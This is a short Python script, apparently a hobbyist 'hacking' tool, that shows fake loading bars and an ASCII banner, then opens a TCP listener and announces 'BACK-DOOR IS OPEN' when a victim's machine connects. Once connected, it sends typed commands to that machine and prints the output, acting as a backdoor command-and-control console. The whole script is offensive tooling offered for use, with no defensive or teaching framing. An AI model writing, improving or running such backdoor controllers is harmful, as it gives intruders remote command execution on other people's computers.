import socket
import os
import time
import sys
import random

time.sleep(3)
os.system("clear")
time.sleep(3)
print ("-------------------------------{LOADING::::::::::::}-------------")
time.sleep(3)
os.system("clear")
time.sleep(3)
print ("                  ╭╮╭━╮╱╭━━━╮╭╮╱╱╭╮")
print ("                  ┃┃┃╭╯╱┃╭━━╯┃╰╮╭╯┃")
print ("                  ┃╰╯╯╱╱┃╰━━╮╰╮╰╯╭╯")
print ("                  ┃╭╮┣━━┫╭━┳┻━╋╮╭╯")
print ("                  ┃┃┃╰┳━┫╰━┻┳━╯┃┃")
print ("                  ╰╯╰━╯╱╰━━━╯╱╱╰╯")
print  ("--------------CODED BY VIP-HACKER----------------------")
time.sleep(3)
print   ("[                    ] 0% ")
time.sleep(4)
print   ("[=====               ] 25%")
time.sleep(4)
print   ( "[==========          ] 50%")
time.sleep(4)
print   ( "[===============     ] 75%")
time.sleep(4)
print   ( "[====================] 100%")
time.sleep(3)
print ( "»»»»»»»»»»»:WELCOME HACKER:«««««««««««")
time.sleep(3)
os.system("ip r")
os.system("date")
time.sleep(3)
server = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
server = socket.socket ()
host= input (str("ENTER YOUR IP : "))
port= int(input('ENTER YOUR PORT:'))
server.bind( (host, port))
server.listen (5)
run = True
client, addr = server.accept()
print ('«BACK-DOOR IS OPEN» ', addr)
        
while run:
    try:
       data = input ('>>>')
       client.send (data.encode ('UTF-8'))
       msg = client.recv(1024)
       print (msg.decode('UTF-8'))
    except ConnectionResetError:
       print('Client Lost Trying to Connect')
       client, addr = server.accept()
       print('Got Connetion from' ,addr)
 
              
